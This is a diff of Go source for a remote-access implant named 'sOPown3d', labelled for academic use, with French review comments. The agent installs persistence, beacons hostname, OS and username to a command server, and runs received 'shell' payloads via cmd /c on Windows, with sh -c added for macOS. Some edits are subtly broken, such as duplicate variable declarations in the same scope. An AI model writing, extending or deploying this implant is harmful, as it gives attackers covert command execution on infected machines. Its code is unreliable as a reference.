@@ -15,38 +15,31 @@ import (
 )
 
 func main() {
+	serverURL := "http://127.0.0.1:8080"
+	info := gatherSystemInfo()
+
 	fmt.Println("=== Agent sOPown3d - Version Commandes ===")
 	fmt.Println("Usage académique uniquement")
 
 	setupPersistence()
 
 	serverURL := "http://127.0.0.1:8080"
-	agentID := generateID()
 
-	fmt.Printf("Agent ID: %s\n", agentID)
+	fmt.Printf("Agent ID: %s\n", info.Hostname)
 	fmt.Println("En attente de commandes...")
 	fmt.Println("----------------------------------------")
 
 	// Boucle principale
 	for i := 1; ; i++ {
-		// 1. Préparer infos
-		info := gatherSystemInfo()
-		info.Hostname = agentID
+		info := gatherSystemInfo() // Pourquoi récuperer a chaque fois les infos ? -> TODO a des fins de logging : à persister dans les logs
 
-		// 2. Envoyer beacon
-		fmt.Printf("[Tour %d] ", i)
-		cmd := sendBeacon(serverURL+"/beacon", info)
+		cmd := sendBeacon(serverURL+"/beacon", info) // l'endpoint beacon servirait donc de point de recuperation des commandes a executer ?
 
-		// 3. Exécuter commande si reçue
-		if cmd != nil && cmd.Action != "" {
-			fmt.Printf("→ Commande: %s\n", cmd.Action)
+		if cmd != nil && cmd.Action != "" { // Si il y a une commande valide
 			executeCommand(cmd)
-		} else {
-			fmt.Println("Aucune commande")
 		}
 
-		// 4. Attendre
-		time.Sleep(5 * time.Second)
+		time.Sleep(500 * time.Millisecond)
 	}
 }
 
@@ -81,46 +74,44 @@ func setupPersistence() {
 // Récupérer infos
 func gatherSystemInfo() shared.AgentInfo {
 	hostname, _ := os.Hostname()
-	username := os.Getenv("USERNAME")
-
 	return shared.AgentInfo{
 		Hostname: hostname,
 		OS:       runtime.GOOS,
-		Username: username,
-		Time:     time.Now().Format("15:04:05"),
+		Username: os.Getenv("USERNAME"),
 	}
 }
 
-// Envoyer beacon
 func sendBeacon(url string, info shared.AgentInfo) *shared.Command {
-	jsonData, _ := json.Marshal(info)
+	serializedAgentInfo, _ := json.Marshal(info) // Serialise en JSON les informations de la machine infecté par l'agent
 
-	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
-	if err != nil {
-		return nil
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(serializedAgentInfo))
+	if err != nil { // Si il y a quelques chose dans erreur
+		return nil // retourne rien -> On ne log pas l erreur ?
 	}
-	defer resp.Body.Close()
+	defer resp.Body.Close() // Ferme un truc à la fin de l'execution de la fonction
 
 	var cmd shared.Command
-	if err := json.NewDecoder(resp.Body).Decode(&cmd); err == nil {
-		if cmd.Action != "" {
-			return &cmd
+	// initialisation dans le if un peu déroutante...
+	if err := json.NewDecoder(resp.Body).Decode(&cmd); err == nil { // Si la déserialisation réussi (si pas d err)
+		if cmd.Action != "" { // Si il y'a une action à mener
+			return &cmd // Retourne la commande
 		}
 	}
 
 	return nil
 }
 
-// Exécuter commande
 func executeCommand(cmd *shared.Command) {
 	switch cmd.Action {
 	case "shell":
 		if cmd.Payload != "" {
-			fmt.Printf("Exécute: %s\n", cmd.Payload)
+			fmt.Printf("Exécute: %s\n", cmd.Payload) // Debug
 
 			var output string
-			if runtime.GOOS == "windows" {
+
+			if runtime.GOOS == "windows" { // SI Windows
 				result, err := exec.Command("cmd", "/c", cmd.Payload).CombinedOutput()
+
 				if err != nil {
 					output = fmt.Sprintf("Erreur: %v", err)
 				} else {
@@ -128,7 +119,17 @@ func executeCommand(cmd *shared.Command) {
 				}
 			}
 
-			fmt.Printf("Résultat:\n%s\n", output)
+			if runtime.GOOS == "darwin" { // SI Macos
+				result, err := exec.Command("sh", "-c", cmd.Payload).CombinedOutput()
+
+				if err != nil {
+					output = fmt.Sprintf("Erreur: %v", err)
+				} else {
+					output = string(result)
+				}
+			}
+
+			fmt.Printf(output) // Print paylaod output
 		}
 
 	case "info":
